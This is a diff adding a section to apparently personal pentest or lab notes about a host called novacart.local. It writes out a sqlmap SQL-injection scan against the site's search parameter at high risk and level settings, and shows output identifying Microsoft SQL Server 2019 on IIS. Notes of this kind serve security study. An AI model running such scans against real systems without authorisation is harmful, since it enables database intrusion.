@@ -201,3 +201,15 @@ Whats interesting is there is a search function that is pulling from a file, cou
 
 Doesnt appear to be vulnerable to SQLi
 
+# SQLi
+
+```python
+sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5
+
+[17:47:27] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2019 or 2022 or 10 or 2016 or 11
+web application technology: Microsoft IIS 10.0, ASP.NET, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2019
+
+
+```
